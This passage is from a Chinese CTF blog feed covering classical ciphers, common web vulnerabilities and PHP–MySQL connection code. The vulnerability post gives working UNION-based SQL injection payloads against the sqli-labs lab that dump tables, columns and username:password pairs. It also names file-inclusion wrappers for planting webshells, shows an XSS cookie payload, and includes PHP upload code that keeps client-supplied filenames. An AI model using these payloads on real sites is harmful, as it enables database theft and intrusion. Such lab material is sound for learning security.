ACIPHER</p><p>抽取字母：TA HC EI RP EH IE SR</p><p>组合得到密码：TAHCEIRPEHIESR</p><p>那么这时候就无法再按照2栏的方法来解了…</p><p><em>1*</em>分析解码*这样，我们可以通过分析密码的字母数来解出密码…</p><p>比如：TAHCEIRPEHIESR</p><p>一共有14个字母，可能是2栏或者7栏…</p><p>尝试2栏…失败</p><p>尝试7栏…成功</p><h2 id="9-培根密码："><a href="#9-培根密码：" class="headerlink" title="9.培根密码："></a><strong>9.培根密码</strong>：</h2><p><strong>特征：010101010101</strong></p><p>培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b。</p><p>第一种方式</p><p>A aaaaa B aaaab C aaaba D aaabb E aabaa</p><p>F aabab G aabba H aabbb I abaaa J abaab</p><p>K ababa L ababb M abbaa N abbab O abbba</p><p>P abbbb Q baaaa R baaab S baaba T baabb</p><p>U babaa V babab W babba X babbb Y bbaaa</p><p>Z bbaab</p><p>第二种方式</p><p>a AAAAA g AABBA n ABBAA t BAABA</p><p>b AAAAB h AABBB o ABBAB u-v BAABB</p><p>c AAABA i-j ABAAA p ABBBA w BABAA</p><p>d AAABB k ABAAB q ABBBB x BABAB</p><p>e AABAA l ABABA r BAAAA y BABBA</p><p>f AABAB m ABABB s BAAAB z BABBB</p><h2 id="10-维吉尼亚密码："><a href="#10-维吉尼亚密码：" class="headerlink" title="10.维吉尼亚密码："></a>10.<strong>维吉尼亚密码</strong>：</h2><p>人们在单一<a href="http://baike.baidu.com/item/恺撒密码" target="_blank" rel="noopener">恺撒密码</a>的基础上扩展出多表密码，维吉尼亚密码引入了“<a href="http://baike.baidu.com/item/密钥" target="_blank" rel="noopener">密钥</a>”的概念，即根据密钥来决定用哪一行的密表来进行替换，以此来对抗字频统计。</p><p>密码表：</p><p>A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p><p>A -A B C D E F G H I J K L M N O P Q R S T U V W X Y Z</p><p>B -B C D E F G H I J K L M N O P Q R S T U V W X Y Z A</p><p>C -C D E F G H I J K L M N O P Q R S T U V W X Y Z A B</p><p>D -D E F G H I J K L M N O P Q R S T U V W X Y Z A B C</p><p>E -E F G H I J K L M N O P Q R S T U V W X Y Z A B C D</p><p>F -F G H I J K L M N O P Q R S T U V W X Y Z A B C D E</p><p>G -G H I J K L M N O P Q R S T U V W X Y Z A B C D E F</p><p>H -H I J K L M N O P Q R S T U V W X Y Z A B C D E F G</p><p>I -I J K L M N O P Q R S T U V W X Y Z A B C D E F G H</p><p>J -J K L M N O P Q R S T U V W X Y Z A B C D E F G H I</p><p>K -K L M N O P Q R S T U V W X Y Z A B C D E F G H I J</p><p>L -L M N O P Q R S T U V W X Y Z A B C D E F G H I J K</p><p>M -M N O P Q R S T U V W X Y Z A B C D E F G H I J K L</p><p>N -N O P Q R S T U V W X Y Z A B C D E F G H I J K L M</p><p>O -O P Q R S T U V W X Y Z A B C D E F G H I J K L M N</p><p>P -P Q R S T U V W X Y Z A B C D E F G H I J K L M N O</p><p>Q -Q R S T U V W X Y Z A B C D E F G H I J K L M N O P</p><p>R -R S T U V W X Y Z A B C D E F G H I J K L M N O P Q</p><p>S -S T U V W X Y Z A B C D E F G H I J K L M N O P Q R</p><p>T -T U V W X Y Z A B C D E F G H I J K L M N O P Q R S</p><p>U -U V W X Y Z A B C D E F G H I J K L M N O P Q R S T</p><p>V -V W X Y Z A B C D E F G H I J K L M N O P Q R S T U</p><p>W -W X Y Z A B C D E F G H I J K L M N O P Q R S T U V</p><p>X -X Y Z A B C D E F G H I J K L M N O P Q R S T U V W</p><p>Y -Y Z A B C D E F G H I J K L M N O P Q R S T U V W X</p><p>Z -Z A B C D E F G H I J K L M N O P Q R S T U V W X Y</p><p>当选定RELATIONS作为密钥时，加密过程是：明文一个字母为T，第一个密钥字母为R，因此可以找到在R行中代替T的为K，依此类推，得出对应关系如下：</p><p>密钥:RELAT IONSR ELATI ONSRE LATIO NSREL</p><p>明文:TOBEO RNOTT OBETH ATIST HEQUE STION</p><p>密文:KSMEH ZBBLK SMEMP OGAJX SEJCS FLZSY</p><h2 id="11-猪圈密码"><a href="#11-猪圈密码" class="headerlink" title="11.猪圈密码"></a>11.<strong>猪圈密码</strong></h2><p>遇到了就自行百度密码表</p><h2 id="12-rabbit加密："><a href="#12-rabbit加密：" class="headerlink" title="12.rabbit加密："></a>12.<strong>rabbit</strong>加密：</h2><p>特征：有U2Fsd开头</p><h2 id="13-utf-7"><a href="#13-utf-7" class="headerlink" title="13.utf-7"></a>13.<strong>utf-7</strong></h2><p>UTF-7 (7-位元 Unicode 转换格式（Unicode Transformation Format，简写成 UTF）) 是一种可变长度字元编码方式，用以将 Unicode 字元以 ASCII 编码的字元串来呈现，可以应用在<a href="http://baike.baidu.com/item/电子邮件" target="_blank" rel="noopener">电子邮件</a>传输之类的应用。</p><h2 id="14-波利比奥斯方阵密码"><a href="#14-波利比奥斯方阵密码" class="headerlink" title="14.波利比奥斯方阵密码"></a>14.<strong>波利比奥斯方阵密码</strong></h2><p>棋盘密码是利用波利比奥斯方阵(Polybius Square)进行加密的密码方式，产生于公元前两世纪的希腊，相传是世界上最早的一种密码。</p><p>简单的来说就是把字母排列好，用坐标的形式表现出来。字母是密文，明文便是字母的坐标。</p><h3 id="排列法1："><a href="#排列法1：" class="headerlink" title="排列法1："></a>排列法1：</h3><p>[<img src="http://www.lsablog.com/wp-content/uploads/2017/04/Picture1.png" alt="img"></p><h3 id="排列法2："><a href="#排列法2：" class="headerlink" title="排列法2："></a>排列法2：</h3><p><img src="http://www.lsablog.com/wp-content/uploads/2017/04/Picture2.png" alt="img">.</p><h2 id="15-摩斯密码："><a href="#15-摩斯密码：" class="headerlink" title="15.摩斯密码："></a>15.摩斯密码：</h2><p>它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。</p><p>密码表：</p><p>A . _ M _ _ Y _ . _ _<br> B _ . . . N _ . Z _ _ . .<br> C _ . _ . O _ _ _ 1 . _ _ _ _<br> D _ . . P . _ _ . 2 . . _ _ _<br> E . Q _ _ . _ 3 . . . _ _<br> F . . _ . R . _ . 4 . . . . _<br> G _ _ . S . . . 5 . . . . .<br> H . . . . T _ 6 _ . . . .<br> I . . U . . _ 7 _ _ . . .<br> J . _ _ _ V . . . _ 8 _ _ _ . .<br> K _ . _ W . _ _ 9 _ _ _ _ .<br> L . _ . . X _ . . _ 0 _ _ _ _ _</p><p>1 =- – – – ？ ==- -==<br> 2 ==- – – / -==-=<br> 3 ===- – （ ) -=- -=-<br> 4 ====- – -====-<br> 5 ===== 。 =-=-=-<br> 6 -====<br> 7 – -===<br> 8 – – -==<br> 9 – – – -=<br> 0 – – – – –</p><h2 id="16-当铺密码："><a href="#16-当铺密码：" class="headerlink" title="16.当铺密码："></a>16.<strong>当铺密码：</strong></h2><p>就是一种将中文和<a href="http://baike.baidu.com/item/数字/6204" target="_blank" rel="noopener">数字</a>进行转化的<a href="http://baike.baidu.com/item/密码/65553" target="_blank" rel="noopener">密码</a>，<a href="http://baike.baidu.com/item/算法" target="_blank" rel="noopener">算法</a>相当简单:当前汉字有多少笔画出头，就是转化成数字几。</p><p>王夫 井工 夫口 由中人 井中 夫夫 由中大：67 84 70 123 82 77 125</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 密码学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常见漏洞原理</title>
      <link href="/2020/09/29/2020-09-29-chang-jian-lou-dong-yuan-li/"/>
      <url>/2020/09/29/2020-09-29-chang-jian-lou-dong-yuan-li/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h1 id="常见web漏洞"><a href="#常见web漏洞" class="headerlink" title="常见web漏洞"></a>常见web漏洞</h1><h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p>SQL注入是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令de web攻击方式。</p><p>由于WEB开发人员几乎不可能对所有输入进行检测，所以SQL注入漏洞几乎是最常见，最广泛的漏洞类型</p><blockquote><p>按照注入点类型来分类</p></blockquote><h3 id="（1）数字型注入点"><a href="#（1）数字型注入点" class="headerlink" title="（1）数字型注入点"></a>（1）数字型注入点</h3><p>许多网页链接有类似的结构 <a href="http://xxx.com/users.php?id=1" target="_blank" rel="noopener">http://xxx.com/users.php?id=1</a> 基于此种形式的注入，一般被叫做数字型注入点，缘由是其注入点 id 类型为数字，在大多数的网页中，诸如 查看用户个人信息，查看文章等，大都会使用这种形式的结构传递id等信息，交给后端，查询出数据库中对应的信息，返回给前台。</p><p>这一类的 SQL 语句原型大概为 <code>select * from 表名 where id=1</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where id=1 and 1=1</code></p><h3 id="（2）字符型注入点"><a href="#（2）字符型注入点" class="headerlink" title="（2）字符型注入点"></a>（2）字符型注入点</h3><p>网页链接有类似的结构 <a href="http://xxx.com/users.php?name=admin" target="_blank" rel="noopener">http://xxx.com/users.php?name=admin</a> 这种形式，其注入点 name 类型为字符类型，所以叫字符型注入点。这一类的 SQL 语句原型大概为 <code>select * from 表名 where name='admin'</code> 值得注意的是这里相比于数字型注入类型的sql语句原型多了引号，可以是单引号或者是双引号。</p><p>若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where name='admin' and 1=1 '</code> 我们需要将这些烦人的引号给处理掉。</p><h3 id="（3）搜索型注入点"><a href="#（3）搜索型注入点" class="headerlink" title="（3）搜索型注入点"></a>（3）搜索型注入点</h3><p>这是一类特殊的注入类型。这类注入主要是指在进行数据搜索时没过滤搜索参数，一般在链接地址中有 <code>"keyword=关键字"</code> 有的不显示在的链接地址里面，而是直接通过搜索框表单提交。</p><p>此类注入点提交的 SQL 语句，其原形大致为：<code>select * from 表名 where 字段 like '%关键字%'</code> 若存在注入，我们可以构造出类似与如下的sql注入语句进行爆破：<code>select * from 表名 where 字段 like '%测试%' and '%1%'='%1%'</code></p><blockquote><p>按照数据提交的方式来分类</p></blockquote><h3 id="（1）GET-注入"><a href="#（1）GET-注入" class="headerlink" title="（1）GET 注入"></a>（1）GET 注入</h3><p>提交数据的方式是 GET , 注入点的位置在 GET 参数部分。比如有这样的一个链接<a href="http://xxx.com/index.php?id=1" target="_blank" rel="noopener">http://xxx.com/index.php?id=1</a> , id 是注入点。</p><h3 id="（2）POST-注入"><a href="#（2）POST-注入" class="headerlink" title="（2）POST 注入"></a>（2）POST 注入</h3><p>使用 POST 方式提交数据，注入点位置在 POST 数据部分，常发生在表单中。</p><h3 id="（3）Cookie-注入"><a href="#（3）Cookie-注入" class="headerlink" title="（3）Cookie 注入"></a>（3）Cookie 注入</h3><p>HTTP 请求的时候会带上客户端的 Cookie, 注入点存在 Cookie 当中的某个字段中。</p><h3 id="（4）HTTP-头部注入"><a href="#（4）HTTP-头部注入" class="headerlink" title="（4）HTTP 头部注入"></a>（4）HTTP 头部注入</h3><p>注入点在 HTTP 请求头部的某个字段中。比如存在 User-Agent 字段中。严格讲的话，Cookie 其实应该也是算头部注入的一种形式。因为在 HTTP 请求的时候，Cookie 是头部的一个字段。</p><blockquote><p>按照执行效果来分类</p></blockquote><h3 id="（1）基于布尔的盲注"><a href="#（1）基于布尔的盲注" class="headerlink" title="（1）基于布尔的盲注"></a>（1）基于布尔的盲注</h3><p>即可以根据返回页面判断条件真假的注入。</p><h3 id="（2）基于时间的盲注"><a href="#（2）基于时间的盲注" class="headerlink" title="（2）基于时间的盲注"></a>（2）基于时间的盲注</h3><p>即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p><h3 id="（3）基于报错注入"><a href="#（3）基于报错注入" class="headerlink" title="（3）基于报错注入"></a>（3）基于报错注入</h3><p>即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p><ol><li>单引号</li><li>双引号</li><li>基于数字型注入</li></ol><h3 id="（4）联合查询注入"><a href="#（4）联合查询注入" class="headerlink" title="（4）联合查询注入"></a>（4）联合查询注入</h3><p>可以使用union的情况下的注入。</p><h3 id="（5）堆查询注入"><a href="#（5）堆查询注入" class="headerlink" title="（5）堆查询注入"></a>（5）堆查询注入</h3><p>可以同时执行多条语句的执行时的注入。</p><h3 id="（6）宽字节注入"><a href="#（6）宽字节注入" class="headerlink" title="（6）宽字节注入"></a>（6）宽字节注入</h3><p>宽字节注入是利用mysql的一个特性，mysql在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）</p><h3 id="基于sqli-labs的实践操作"><a href="#基于sqli-labs的实践操作" class="headerlink" title="基于sqli-labs的实践操作"></a>基于sqli-labs的实践操作</h3><h4 id="1-基于报错的GET-sql注入"><a href="#1-基于报错的GET-sql注入" class="headerlink" title="1.基于报错的GET sql注入"></a>1.基于报错的GET sql注入</h4><h5 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h5><p><img src="/img/less-1.png" alt=""></p><p>提示说输入一个数字作为ID的值</p><p>那么先在url输入?id=1</p><p><img src="/img/less-1%E8%BE%93%E5%85%A5id=1.png" alt=""></p><p>显示查询成功，返回了用户Dumb</p><p>然后尝试使其报错，输入 ?id=1’</p><p><img src="/img/less-1%E8%BE%93%E5%85%A5id-1'.png" alt=""></p><p>报错了，显示为 ‘’1’’ LIMIT 0,1’</p><p>有了这个，我们就可以揣测一下网站后端的sql请求语句了</p><p>首先，这个报错语句是被 ‘ ‘ 单引号闭合的，于是将其拆分 ‘   ‘1’’ LIMIT 0,1   ‘，可知报错的段落是 ‘1’’ LIMIT 0,1,由于我们输入的id值是1’</p><p>,所以再拆分一下为’   1’   ‘ LIMIT 0,1</p><p>由此可以看出后台语句大致是 </p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = '$id' limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> id被单引号包裹，这是字符型注入点</p><h5 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h5><p><img src="/img/less-2.png" alt=""></p><p>流程与上面差不多</p><p>不同的是，这次输入id=1’后报错为 ‘’ LIMIT 0,1’</p><p>还是用和上面一样的方法拆分这段 ，’     ‘ LIMIT 0,1      ‘  –&gt;’ LIMIT 0,1</p><p>可以看到limit前面多了一个单引号，而我们正是在1后面多加了一个单引号，说明这个单引号并没有被id读进去</p><p>由此可以看出后台语句大致是 </p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id =$ id limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>id没有被单引号包裹，这是一个数字型注入点</p><h5 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h5><p><img src="/img/less-3.png" alt=""></p><p>这次的报错是 ‘’1’’) LIMIT 0,1’</p><p>拆分 ‘   ‘1’’) LIMIT 0,1   ‘–&gt;’1’’) LIMIT 0,1–&gt;’   <em>1’</em>   ‘) LIMIT 0,1</p><p>显然，后台语句是</p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ('$id') limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>但上面的语句只不过都是猜测，怎么验证呢，只有再构造语句来验证了</p><p>比如上面这个less-3</p><p>我们试着把输入改为 id=1’) –+或id=1’) –%20</p><p><img src="/img/--+.png" alt=""></p><p><img src="/img/--%20.png" alt=""></p><p>都成功了，这就说明后台语句和我们想的八九不离十了</p><h5 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h5><p>这次除了使用注释符，用上面的方法怎么输入页面都不报错，而题目说了 Double quotes,显然这次id是被””包裹了，输入的id值都会被当作字符串，加单引号括号都没用。</p><p>那就使用\来制造报错，输入 id=1\</p><p>返回报错 ‘“1\“) LIMIT 0,1’–&gt;”1\“) LIMIT 0,1</p><p>\将后面的双引号消掉了，于是这一段语句就闭合不了了，遂报错</p><p>合理推测：</p><pre class="line-numbers language-mysql"><code class="language-mysql">"SELECT username,password FROM user WHERE id = ("id") limit 0,1 "<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>验证：</p><p><img src="/img/less-4.png" alt=""></p><p>这样4种不同的注入点的后台语句就通过报错大致的试出来了</p><p>之后就可以根据注入点类型通过order by语句测试字段数，通过union语句爆出表名，字段名等</p><p>例如less-1(字符型) 就可以输入?id=1’ order by 1(,2,3,4… ) –+测出该表中column的数量，order by最多能够到几，表中就有几段column，这对之后union注入有大用</p><p>less-1能够order by到3，也就是它有3个字段，于是接下来union注入</p><p>我们要构造的语句是SELECT username,password FROM user WHERE id = ‘0’ union select 1,2,3 –+ limit 0,1</p><p>所以输入（如果利用hackerbar或max hackerbar工具会方便很多）：id=0’ union select 1,2,3 –+</p><p>这里构造id=0的目的就是让这一段请求报错，这样页面上显示的才是union联合语句查找出来的结果</p><p>效果</p><p><img src="/img/union%E6%B3%A8%E5%85%A5.png" alt=""></p><p>可以看到，我们select 1,2,3 ，它回显了2，3，说明返回的是三个字段中的第二个和第三个，这对接下来爆表和爆库有用</p><p>于是接下来注入 id=0’ union select 1,user(),database() –+</p><p><img src="/img/union%E7%88%86%E5%BA%93.png" alt=""></p><p>爆出了用户名和使用的数据库名</p><p>然后还可以用version()函数爆出数据库版本，这样就可以针对性的进行一些注入</p><p>例如：</p><p>爆表：</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database() --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​            information_schema是储存了所有数据库信息的库，tables储存了所有表信息的表</p><p><img src="/img/union%E7%88%86%E8%A1%A8.png" alt=""></p><p>看到了最后一个表是’users’,可用于下一步爆字段</p><p>爆字段：</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_name='users' --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/img/union%E7%88%86%E5%AD%97%E6%AE%B5.png" alt=""></p><p>爆出来了users表中的所有字段，最重要的user,password等全出来了，接下来就可以union查询出它们的值了</p><pre class="line-numbers language-mysql"><code class="language-mysql">id=0' union select 1,group_concat(username,0x3a,password),3 from users --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="img%5Cunion%E7%88%86%E5%87%BA%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81.png" alt=""></p><p>好家伙，借助group_concat()方法，该数据库所有的账号密码都以“账号：密码”的格式爆出来了</p><h2 id="任意文件包含"><a href="#任意文件包含" class="headerlink" title="任意文件包含"></a>任意文件包含</h2><p>网站服务器配置中的allow_url_fopen以及allow_url_include对文件包含的实现影响很大</p><p>最常用的方式是在页面可以包含文件的情况下，用file://(本地文件包含) ,php://filter(input, memory,temp) ,data:// ,zip://系列 ,http://(远程文件包含)还有phar:// 等伪协议进行文件包含，进行传马，getshell等操作</p><h2 id="XSS跨站请求"><a href="#XSS跨站请求" class="headerlink" title="XSS跨站请求"></a>XSS跨站请求</h2><h3 id="反射型-reflect"><a href="#反射型-reflect" class="headerlink" title="反射型(reflect)"></a>反射型(reflect)</h3><p>还没彻底整明白，以后再水</p><h3 id="储存型-store"><a href="#储存型-store" class="headerlink" title="储存型(store)"></a>储存型(store)</h3><p>还没彻底整明白，以后再水</p><h3 id="DOM型"><a href="#DOM型" class="headerlink" title="DOM型"></a>DOM型</h3><p>上次招新赛就是DOM型，传入的username参数会被嵌入到返回页面的DOM中，直接嵌入</p><pre class="line-numbers language-HTML"><code class="language-HTML"><script>alert(document.cookie)</script><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>直接弹出cookie</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>重要基础知识</p><pre><code>当客户端提交后，收到上传文件的页面获得了一个$_FILES 数组 $_FILES数组内容如下: $_FILES['myFile']['name'] 客户端文件的原名称。 $_FILES['myFile']['type'] 文件的 MIME 类型，需要浏览器提供该信息的支持。 $_FILES['myFile']['size'] 已上传文件的大小，单位为字节。 $_FILES['myFile']['tmp_name'] 文件被上传后在服务端储存的临时文件名，一般是系统默认。可以在php.ini的upload_tmp_dir 指定，但 用 putenv() 函数设置是不起作用的。 $_FILES['myFile']['error'] 和该文件上传相关的错误代码。['error'] 是在 PHP 4.2.0 版本中增加的。下面是它的说明：(它们在PHP3.0以后成了常量) UPLOAD_ERR_OK 值：0; 没有错误发生，文件上传成功。 UPLOAD_ERR_INI_SIZE 值：1; 上传的文件超过了 php.ini 中 upload_max_filesize 选项限制的值。 UPLOAD_ERR_FORM_SIZE 值：2; 上传文件的大小超过了 HTML 表单中 MAX_FILE_SIZE 选项指定的值。 UPLOAD_ERR_PARTIAL 值：3; 文件只有部分被上传。 UPLOAD_ERR_NO_FILE 值：4; 没有文件被上传。 值：5; 上传文件大小为0. 文件被上传结束后，默认地被存储在了临时目录中，这时您必须将它从临时目录中删除或移动到其它地方，如果没有，则会被删除。也就是不管是否上传成功，脚本执行完后临时目录里的文件肯定会被删除。所以在删除之前要用PHP的 copy() 函数将它复制到其它位置，此时，才算完成了上传文件过程。</code></pre><h3 id="PHP-FILES中error返回值详解"><a href="#PHP-FILES中error返回值详解" class="headerlink" title="PHP $_FILES中error返回值详解"></a>PHP $_FILES中error返回值详解</h3><p>用PHP上传文件时，我们会用程序去监听浏览器发送过来的文件信息，首先会通 过$_FILES[fieldName][‘error’]的不同数值来判断此欲上传的文件状态是否正常。$_FILES[fieldName] [‘error’]==0代表一切正常，其它数值的具体含义请参考下面一段程序的注释部分</p><p>$_FILES[‘file’][‘error’]值 </p><p>UPLOAD_ERR_OK: 0 //正常，上传成功 </p><p>UPLOAD_ERR_INI_SIZE: 1 //上传文件大小超过服务器允许上传的最大值，php.ini中设置upload_max_filesize选项限制的值 </p><p>UPLOAD_ERR_FORM_SIZE: 2 //上传文件大小超过HTML表单中隐藏域MAX_FILE_SIZE选项指定的值 </p><p>UPLOAD_ERR_PARTIAL: 3 //文件只有部分被上传 </p><p>UPLOAD_ERR_NO_FILE: 4 //没有文件被上传</p><p>UPLOAD_ERR_NO_SIZE: 5//上传文件大小为0</p><p>UPLOAD_ERR_NO_TMP_DIR: 6 //没有找不到临时文件夹 </p><p>UPLOAD_ERR_CANT_WRITE: 7 //文件写入失败 </p><p>UPLOAD_ERR_EXTENSION: 8 //php文件上传扩展没有打开 </p><h3 id="PHP文件上传-move-uploaded-file-参数的正确写法"><a href="#PHP文件上传-move-uploaded-file-参数的正确写法" class="headerlink" title="PHP文件上传 move_uploaded_file() 参数的正确写法"></a>PHP文件上传 move_uploaded_file() 参数的正确写法</h3><p>该函数的作用是把上传的文件移动到一个新的位置。因为前端文件上传之后是存在一个临时文件中，在脚本结束后，临时文件就会销毁，所以如果想要保存上传的文件，就需要使用move_uploaded_file()函数将文件转移到指定存放位置。<br>有两个参数，第一个参数是你上传后的临时文件名，由系统自动生成。通常其名称在</p><pre><code>$_FILE["file"]["tmp_name"];</code></pre><p>其中的file为你前台文件上传表单的名称(“name”)。<br><strong>第二个参数就是包含有路径的新的文件名</strong>。如：<br>“upload/1.jpg”;<br>这样，就会把你上传的文件，移动到当前目录下名称upload的子目录下，并把文件名保存为：1.jpg</p><h3 id="php-move-uploaded-file-介绍"><a href="#php-move-uploaded-file-介绍" class="headerlink" title="php move_uploaded_file()介绍"></a>php move_uploaded_file()介绍</h3><p>move_uploaded_file() 函数将上传的文件移动到新位置。若成功，则返回 true，否则返回 false。</p><p><strong>语法</strong></p><pre class="line-numbers language-php"><code class="language-php"><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span>filename<span class="token punctuation">,</span>destination<span class="token punctuation">)</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token string">"upload/"</span><span class="token punctuation">.</span><span class="token variable">$_FILE</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token comment" spellcheck="true">//将临时文件拷贝到upload目录下的同名文件中</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>参数</strong> </p><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>filename</td><td>上传的文件的文件名。</td></tr><tr><td>destination</td><td>移动文件到这个位置。</td></tr></tbody></table><p><strong>本函数检查并确保由 filename 指定的文件是合法的上传文件。如果文件合法，则将其移动到 destination指定的位置。</strong></p><p>如果 filename 不是合法的上传文件，不会出现任何操作，move_uploaded_file() 将返回 false。</p><p>如果 filename 是合法的上传文件，但出于某些原因无法移动，不会出现任何操作，move_uploaded_file() 将返回 false，此外还会发出一条警告。</p><p><strong>注意</strong></p><ol><li>本函数仅用于通过 HTTP POST 上传的文件。</li><li>如果目标文件已经存在，将会被覆盖。</li></ol><h3 id="move-uploaded-file-函数实例"><a href="#move-uploaded-file-函数实例" class="headerlink" title="move_uploaded_file()函数实例"></a>move_uploaded_file()函数实例</h3><p>使用move_uploaded_file()函数上传文件到服务器。</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>     <span class="token variable">$tmp_filename</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">'myupload'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">'tmp_name'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_filename</span><span class="token punctuation">,</span><span class="token string">"/path/to/dest/{$_FILES['myupload']['name']}"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>          <span class="token keyword">echo</span> <span class="token string">"An error has occurred moving the uploaded file.&lt;BR>"</span><span class="token punctuation">;</span>          <span class="token keyword">echo</span> <span class="token string">"Please ensure that if safe_mode is on that the "</span> <span class="token punctuation">.</span> <span class="token string">"UID PHP is using matches the file."</span><span class="token punctuation">;</span>          exit<span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>          <span class="token keyword">echo</span> <span class="token string">"The file has been successfully uploaded!"</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span><span class="token delimiter">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> blog </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php连接mysql</title>
      <link href="/2020/09/29/2020-09-26-php-lian-jie-mysql/"/>
      <url>/2020/09/29/2020-09-26-php-lian-jie-mysql/</url>
      
        <content type="html"><![CDATA[<h1 id="php连接MySQL"><a href="#php连接MySQL" class="headerlink" title="php连接MySQL"></a>php连接MySQL</h1><h2 id="用mysqli以面向对象的方式连接mysql数据库"><a href="#用mysqli以面向对象的方式连接mysql数据库" class="headerlink" title="用mysqli以面向对象的方式连接mysql数据库"></a>用mysqli以面向对象的方式连接mysql数据库</h2><p>在本地网站建一个这样的index.php,就能连接到本地MySQL服务器了，以下代码纯手撸~ 可以自行输入服务器名，用户，密码</p><pre class="line-numbers language-php+HTML"><code class="language-php+HTML"><?phpif($_POST['servername']&&$_POST['username']&&$_POST['passwd']){        $servername=$_POST['servername'];        $username=$_POST['username'];        $password=$_POST['passwd'];// $dbname=$_GET['dbname'];        $sql = new mysqli($servername,$username,$password);        if($sql->connect_error)        {                die("连接失败：".$sql->connect_error);        }        else        {                echo "<script>alert(\"连接成功\")</script>";                // header('Location:cmd.php');                // exit;                $url = "cmd.php";                echo "<script language='javascript' type='text/javascript'>";                echo "window.location.href='$url'";                echo "</script>";        }}else{?><!DOCTYPE html><html lang="en"><head>        <meta charset="UTF-8">        <meta name="viewport" content="width=device-width, initial-scale=1.0">        <title>连接数据库</title></head><body>        <p>        请输入服务器，用户名以及密码        </p>        <form action="index.php" method="post">        服务器：<input type="text" name="servername">        用户名：<input type="text" name="username">        密码：<input type="password" name="passwd">        <input type="submit" value="提交">        </form>        <p id="success">        </p></body></html><?php}?><span aria-hidden="true" 